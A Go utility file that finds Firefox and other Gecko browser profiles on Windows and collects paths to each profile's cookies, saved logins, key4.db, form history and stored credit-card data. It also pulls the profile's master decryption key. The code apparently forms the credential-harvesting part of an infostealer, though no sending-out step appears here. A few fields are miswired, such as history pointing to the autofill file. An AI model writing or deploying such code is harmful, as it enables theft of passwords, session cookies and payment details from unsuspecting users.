package utils

import (
	"os"
	"slices"
	"strings"
)

var (
	localAppdata   = os.Getenv("LOCALAPPDATA")
	roamingAppdata = os.Getenv("APPDATA")
)

func traverse(path string, filter string) (dirs []string, err error) {
	entries, err := os.ReadDir(path)
	for _, item := range entries {
		if !item.IsDir() {
			continue
		}
		newpath := path + "\\" + item.Name()
		dir2, errr := os.ReadDir(newpath)
		if errr != nil {
			return nil, errr
		}
		for _, item2 := range dir2 {
			if item2.Name() == filter {
				dirs = append(dirs, newpath)
			} else {
				if !item2.IsDir() {
					continue
				}
				newpath2 := newpath + "\\" + item2.Name()
				dir3, errr := os.ReadDir(newpath2)
				if errr != nil {
					return nil, errr
				}
				for _, item3 := range dir3 {
					if item3.Name() == filter {
						dirs = append(dirs, newpath2)
					}
				}
			}
		}
	}
	return
}

func traverseGecko(path string) (dirs []string, err error) {
	entries, err := os.ReadDir(path)
	for _, item := range entries {
		if !item.IsDir() {
			continue
		}
		newpath := path + "\\" + item.Name()
		dir2, errr := os.ReadDir(newpath)
		if errr != nil {
			return nil, errr
		}
		for _, item2 := range dir2 {
			if !item2.IsDir() {
				continue
			}
			newpath2 := newpath + "\\" + item2.Name()
			dir3, errr := os.ReadDir(newpath2)
			if errr != nil {
				return nil, errr
			}
			for _, item3 := range dir3 {
				if !item3.IsDir() {
					continue
				}
				newpath2 := newpath2 + "\\" + item3.Name()
				dir4, errr := os.ReadDir(newpath2)
				if errr != nil {
					return nil, errr
				}
				for _, item4 := range dir4 {
					newpath3 := newpath2 + "\\" + item4.Name()
					if strings.HasSuffix(item4.Name(), ".default-release") || strings.Contains(item4.Name(), ".default-default") {
						dirs = append(dirs, newpath3)
					}
				}
			}
		}
	}
	return
}

func dirExist(paths ...string) bool {
	for _, path := range paths {
		_, err := os.Stat(path)
		if os.IsNotExist(err) {
			return false
		}
	}
	return true
}



func sortGecko(paths []string) (browsers []BrowserPaths, err error) {
	for _, path := range paths {
		cookies := path + "\\cookies.sqlite"
		loginData := path + "\\logins.json"
		localState := path + "\\key4.db"
		autofill := path + "\\formhistory.sqlite"
		history := path + "\\places.sqlite"
		bookmarks := path + "\\places.sqlite"
		creditcards := path + "\\autofill-profiles.json"

		if dirExist(cookies, loginData, autofill, localState, history, bookmarks) {
			masterKey, _ := GetGeckoMasterKey(localState)
			browser := BrowserPaths{
				Path:       path,
				LocalState: localState,
				LoginData:  loginData,
				WebData:    autofill,
				History:    autofill,
				Cookies:    cookies,
				Bookmarks:  bookmarks,
				CreditCard: creditcards,
				MasterKey:  masterKey,
			}
			browsers = append(browsers, browser)
		}
	}
	return
}


func getGeckoProfiles(path string) (paths []string, err error) {
	bPaths, err := os.ReadDir(path)
	if err != nil {
		return
	}
	for _, bPath := range bPaths {
		if bPath.IsDir() && (strings.HasSuffix(bPath.Name(), ".default-default") || strings.Contains(bPath.Name(), ".default-release")) {
			paths = append(paths, path+"\\"+bPath.Name())
		}
	}
	return
}



func DiscoverGecko() (browsers []BrowserPaths, err error) {
	roamingEntries, err := traverseGecko(roamingAppdata)
	if err != nil {
		return
	}

	sortedRoaming, err := sortGecko(roamingEntries)
	if err != nil {
		return
	}

	browsers = append(browsers, sortedRoaming...)

	return
}

func Deduplicate(array []string) (result []string) {
	for _, i := range array {
		if !slices.Contains(result, i) {
			result = append(result, i)
		}
	}
	return
}
